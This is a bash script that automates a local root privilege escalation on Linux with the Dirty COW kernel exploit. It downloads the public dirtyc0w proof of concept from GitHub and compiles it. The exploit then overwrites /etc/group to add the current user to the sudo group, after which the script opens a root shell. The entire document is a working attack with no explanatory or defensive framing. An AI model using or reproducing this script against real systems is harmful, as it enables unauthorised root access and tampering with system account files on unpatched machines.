#!/bin/bash
var=$(whoami)
wget https://github.com/dirtycow/dirtycow.github.io/archive/master.zip
mkdir DC
mv master.zip DC
cd DC
unzip master.zip
cd dirtycow.github.io-master
gcc -pthread -o dirtyc0w dirtyc0w.c
./dirtyc0w /etc/group "$(sed '/\(sudo*\)/ s/$/,$var/' /etc/group)"
sudo -s

